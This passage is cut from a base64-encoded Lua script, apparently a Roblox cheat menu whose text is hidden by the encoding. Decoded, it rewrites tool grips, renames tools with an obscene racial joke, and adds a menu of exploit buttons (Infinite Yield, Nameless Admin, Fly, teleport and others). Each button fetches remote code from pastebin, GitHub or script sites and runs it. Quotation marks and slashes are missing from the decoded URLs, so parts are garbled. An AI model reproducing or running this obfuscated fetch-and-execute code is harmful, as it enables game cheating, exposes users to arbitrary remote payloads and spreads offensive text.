MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTQuNSwgNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTE1LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xNi41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTcuNSwgNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTE4LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xOS41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMjAuNSwgNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTIxLjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yMi41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMjMuNSwgNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTI0LjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yNS41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMjYsIDMpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yNywgMikKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTI3LCAwKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmcmFtZQogICAgICAgICAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sSXNBKFRvb2wpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sLk5hbWUgPT0gbmFtZXRvb2xzIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgVW5pdmVyc2FsVGFiID0gV2luZG93TWFrZVRhYih7U2NyaXB0cyBVbml2ZXJzYWlzLCBwbGFuZX0pCgotLSBTZefjbyBwYXJhIFNjcmlwdHMgVW5pdmVyc2FpcwpTZWN0aW9uID0gVW5pdmVyc2FsVGFiQWRkU2VjdGlvbih7CiAgICBOYW1lID0gU2NyaXB0cyBVbml2ZXJzYWlzCn0pCgotLSBCb3TjbyBwYXJhIFJhZWwgSHViIEJyb29rClVuaXZlcnNhbFRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gUmFlbCBIdWIgQnJvb2ssCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWVIdHRwR2V0KGh0dHBzcmF3c2NyaXB0cy5uZXRyYXdUaGUtTWltaWMtUmFlbC1IdWItMjA5MjEpKSgpCiAgICBlbmQKfSkKCi0tIEJvdONvIHBhcmEgU2hpZnRMb2NrClVuaXZlcnNhbFRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gU2hpZnRMb2NrLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lSHR0cEdldChodHRwc3Bhc3RlYmluLmNvbXJhd04ydGlIZ3l2KSkoKQogICAgZW5kCn0pCgotLSBCb3TjbyBwYXJhIEdob3N0IEh1YgpVbml2ZXJzYWxUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IEdob3N0IEh1YiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZUh0dHBHZXQoaHR0cHNyYXdzY3JpcHRzLm5ldHJhd1VuaXZlcnNhbC1TY3JpcHQtR2hvc3RIdWItMTY1MzQpKSgpCiAgICBlbmQKfSkKCi0tIEJvdONvIHBhcmEgSW5maW5pdGUgWWllbGQKVW5pdmVyc2FsVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBJbmZpbml0ZVlpZWxkIC0gQ21kLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lSHR0cEdldChodHRwc3Jhdy5naXRodWJ1c2VyY29udGVudC5jb21FZGdlSVlpbmZpbml0ZXlpZWxkbWFzdGVyc291cmNlKSkoKQogICAgZW5kCn0pCgotLSBCb3TjbyBwYXJhIFRQIFRvb2wKVW5pdmVyc2FsVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBUUCBUb29sLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lSHR0cEdldChodHRwc3Jhdy5naXRodWJ1c2VyY29udGVudC5jb21lcnIwcjEyOUtwdEhhZGVzQmxhaXJtYWluQmFvLmx1YSkpKCkKICAgIGVuZAp9KQoKLS0gQm90428gcGFyYSBGbHkgR3VpClVuaXZlcnNhbFRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gRmx5IEd1aSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZUh0dHBHZXQoaHR0cHNzY3JpcHRibG94LmNvbXJhd1VuaXZlcnNhbC1TY3JpcHQtRmx5LXYzLTc0MTIpKSgpCiAgICBlbmQKfSkKCi0tIEJvdONvIHBhcmEgTmFtZWxlc3MgQWRtaW4gClVuaXZlcnNhbFRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gTmFtZWxlc3MgQWRtaW4gLSBDbWQsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWVIdHRwR2V0KGh0dHBzcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbUZpbHRlcmluZ0VuYWJsZWROYW1lbGVzc0FkbWlubWFpblNvdXJjZSkpKCkKICAgIGVuZAp9KQoKClVuaXZlcnNhbFRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gVGVsZWtpbmVzaXMsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2Fkc3RyaW5nKGdhbWVIdHRwR2V0KGh0dHBzcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbVNBWlhIVUJDb250cm9sLXVwZGF0ZW1haW5SRUFETUUubWQsIHRydWUpKSgpCiAgICBlbmQKfSkKCgoKCgogICA="))()
